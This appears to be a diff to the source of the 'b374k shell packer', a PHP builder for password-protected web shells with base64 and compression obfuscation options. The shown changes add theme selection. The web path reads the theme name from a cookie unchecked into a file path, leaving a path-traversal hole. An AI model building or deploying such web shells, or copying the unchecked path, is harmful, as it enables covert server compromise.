@@ -7,16 +7,12 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.1";
+$GLOBALS['packer']['version'] = "0.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
+$GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
-
-// change color
-$GLOBALS['packer']['color'] = "#4C6B72";
-//$GLOBALS['packer']['color'] = "#5C6188";
-//$GLOBALS['packer']['color'] = "#408494";
-
+$GLOBALS['packer']['theme'] = packer_get_theme();
 
 /* PHP FILES START */
 $base_code = "";
@@ -32,9 +28,11 @@ $js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js"
 $js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
 $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
-//$css_code = file_get_contents($GLOBALS['packer']['base_dir']."chocolate.css");
-$css_code = packer_read_file($GLOBALS['packer']['base_dir']."style.css");
-$css_code = str_replace("<__COLOR__>", $GLOBALS['packer']['color'], $css_code);
+
+if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
+else $theme ="default";
+$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
+
 /* JAVASCRIPT AND CSS FILES END */
 
 // layout
@@ -110,6 +108,13 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
 	}
 	else{
+	
+	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:100px;'>";
+	foreach($GLOBALS['packer']['theme'] as $k){
+		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
+		else $available_themes .= "<option>".$k."</option>";
+	}
+	$available_themes .= "</select></td></tr>";
 
 	?><!doctype html>
 	<html>
@@ -134,6 +139,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		<table class='boxtbl'>
 			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
 			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
+			<?php echo $available_themes; ?>
 			<tr><td colspan='2'>
 				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
 				<input type='button' class='button' id='runGo' value='Run'>
@@ -146,7 +152,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
 			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
 			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
-
+			<?php echo $available_themes; ?>
 			<tr><td>Strip Comments and Whitespaces</td><td>
 				<select id='strip' style='width:100px;'>
 					<option selected="selected">yes</option>
@@ -225,6 +231,12 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			});
 
 		});
+		
+		$('.theme').on('change', function(e){
+			$('.theme').val($(this).val());
+			set_cookie('packer_theme', $('.theme').val());
+			location.href = targeturl;
+		});
 	});
 
 	function refresh_row(){
@@ -250,19 +262,27 @@ else{
 		$output .= "options :\n";
 		$output .= "\t-o filename\t\t\t\tsave as filename\n";
 		$output .= "\t-p password\t\t\t\tprotect with password\n";
+		$output .= "\t-t theme\t\t\t\ttheme to use\n";
 		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
 		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
 		$output .= "\t-b\t\t\t\t\tencode with base64\n";
 		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
+		$output .= "\t-k\t\t\t\t\tlist available themes\n";
 
 	}
 	else{
-		$opt = getopt("o:p:m:sbz:c:l");
+		$opt = getopt("o:p:t:m:sbz:c:lk");
 
 		if(isset($opt['l'])){
 			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
+			echo $output;
+			die();
+		}
+		
+		if(isset($opt['k'])){
+			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
 			echo $output;
 			die();
 		}
@@ -277,7 +297,15 @@ else{
 		}
 
 		$password = isset($opt['p'])? trim($opt['p']):"";
-		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $available_modules);
+		$theme = isset($opt['t'])? trim($opt['t']):"default";
+		if(!in_array($theme, $GLOBALS['packer']['theme'])){
+			$output .= "error : unknown theme file\n\n";
+			echo $output;
+			die();
+		}
+		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
+		
+		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
 		if(empty($modules)) $modules = array();
 		else $modules = explode("," ,$modules);
 
@@ -308,6 +336,7 @@ else{
 
 		$output .= "Filename\t\t: ".$outputfile."\n";
 		$output .= "Password\t\t: ".$password."\n";
+		$output .= "Theme\t\t\t: ".$theme."\n";
 		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
 		$output .= "Strip\t\t\t: ".$strip."\n";
 		$output .= "Base64\t\t\t: ".$base64."\n";
@@ -409,6 +438,15 @@ function packer_strips($str){
 	}
 	$newStr = preg_replace("/(\s{2,})/", " ", $newStr);
 	return $newStr;
+}
+
+function packer_get_theme(){
+	$available_themes = array();
+	foreach(glob($GLOBALS['packer']['theme_dir']."*.css") as $filename){
+		$filename = basename($filename, ".css");
+		$available_themes[] = $filename;
+	}
+	return $available_themes;
 }
 
 function packer_get_module(){
